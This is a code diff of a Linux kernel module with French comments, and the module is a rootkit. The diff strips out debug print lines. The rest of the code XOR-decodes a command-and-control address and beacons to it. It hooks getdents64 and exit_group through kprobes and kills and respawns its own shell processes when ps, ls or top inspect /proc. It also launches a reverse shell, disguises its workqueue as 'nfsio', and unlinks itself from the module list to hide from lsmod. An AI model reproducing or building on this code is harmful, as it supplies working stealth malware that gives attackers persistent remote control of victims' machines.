@@ -34,33 +34,21 @@ static void custom_xor(u8 *dst, const u8 *src, u8 key, unsigned int len) {
 }
 
 /* Fonction pour rechercher et kill nos processus */
-/* Appellée directement si 'ps' ou 'top', et si un 'ls' ou 'sh' interagit avec /proc */
 static void find_and_kill_our_processes(void) {
-	/* pr_info("[+] Inside find_and_kill_our_processes\n"); */
     struct task_struct *task;
     for_each_process(task) {
-		/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-		/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
         // les sh qui ont pour parent kthreadd
 		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
-        	/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
 			send_sig(SIGKILL, task, 0);
 		    killed = true;	
 		}
+		// les sh qui ont pour parent sh 
 		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
-			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
 			send_sig(SIGKILL, task, 0);
 			killed = true;
 		}
 		// pour les sleep
 		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) { 
-			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
 			send_sig(SIGKILL, task, 0);
 			killed = true;
 		}
@@ -69,7 +57,6 @@ static void find_and_kill_our_processes(void) {
 
 
 /* Fonction pour rechercher dans les fichiers utilisé par la tache en cours si ils sont liés à /proc */ 
-/* Appellée si 'ls' ou 'sh' */
 static void if_its_related_to_proc_we_kill(void) {
 	/* pr_info("[+] Inside if_its_related_to_proc_we_kill\n"); */
 	if (current->files) {
@@ -96,7 +83,6 @@ static void if_its_related_to_proc_we_kill(void) {
 
 /* Handler pour la fonction hookée (__x64_sys_getdents64) */
 static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
-	/* pr_info("[+] Hooked __x64_sys_getdents64! PID: %d, name: %s", current->pid, current->comm); */
 	if (killed) {
 		return 0;
 	} 
@@ -139,11 +125,10 @@ static void make_request(char *str) {
 
 /* Fonction exécutée dans la workqueue */
 static void my_work_handler(struct work_struct *work) {
-    /* pr_info("[+] Inside my_work_handler\n"); */
     make_request("RESTARTED_BECAUSE_SOMETHING_KILLED_ME");
     rev_shell();
     make_request_periodic();
-    kfree(work); // Libérer la mémoire après exécution
+    kfree(work); 
 }
 
 /* Fonction pour respawn nos processus */
@@ -151,13 +136,11 @@ static void respawn_our_processes(void) {
 
     struct work_struct *work = kmalloc(sizeof(struct work_struct), GFP_ATOMIC);
     if (!work) {
-        /* pr_err("[-] Failed to allocate memory for work_struct\n"); */
         return;
     }
 
 	INIT_WORK(work, my_work_handler);
     if (!queue_work(wq, work)) {
-        /* pr_err("[-] Failed to queue work\n"); */
         kfree(work);
     }
 }
@@ -165,7 +148,6 @@ static void respawn_our_processes(void) {
 
 /* Handler pour la fonction hookée (__x64_sys_exit_group) */
 static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
-	/* pr_info("[+] Hooked __x64_sys_exit_group! PID: %d, name: %s", current->pid, current->comm); */
 	if (killed) {
 		respawn_our_processes();
 		killed = false;
@@ -179,7 +161,6 @@ static int __init hook_init(void) {
 	// récupérer l'IP du C2 a partir du param
  	u8 key = 126;
 	custom_xor(host, host, key, strlen(host));
-	/* pr_info("[+] IP: %s\n", host); */
 
 	// networking start
 	make_request("START");
@@ -191,15 +172,12 @@ static int __init hook_init(void) {
 	kp2.symbol_name = "__x64_sys_getdents64";
 	kp2.pre_handler = handler_pre2;
 	if (register_kprobe(&kp2)) {
-		/* pr_err("[-] Failed to register kprobe\n"); */
 		return -1;
 	}
-	/* pr_info("[+] __x64_sys_getdents64 hooked successfully\n"); */
 
 	// workqueue to spawn our process after they are killed
 	wq = create_singlethread_workqueue("nfsio");
 	if (!wq) {
-		/* pr_err("[-] Failed to create workqueue\n"); */
 		return -1;
 	}
 
@@ -207,10 +185,8 @@ static int __init hook_init(void) {
 	kp3.symbol_name = "__x64_sys_exit_group";
 	kp3.pre_handler = handler_pre3;
 	if (register_kprobe(&kp3)) {
-		/* pr_err("[-] Failed to register kprobe\n"); */
 		return -1;
 	}
-	/* pr_info("[+] __x64_sys_exit_group hooked successfully\n"); */
 
 	// remove from lsmod and /proc/modules
 	list_del(&THIS_MODULE->list); 	
